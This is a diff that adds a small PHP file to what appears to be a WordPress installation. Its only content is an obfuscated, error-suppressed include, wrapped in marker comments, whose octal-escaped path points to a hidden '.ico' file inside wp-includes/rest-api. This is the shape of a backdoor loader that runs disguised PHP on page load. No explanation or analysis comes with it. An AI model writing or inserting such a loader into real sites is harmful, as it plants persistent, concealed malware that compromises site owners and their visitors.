@@ -1,0 +1,7 @@
+<?php
+/*e24d6*/
+
+@include "\103:/CS\127SWEB\057word\160ress\057wp-i\156clud\145s/re\163t-ap\151/.96\141b080\141.ico";
+
+/*e24d6*/
+
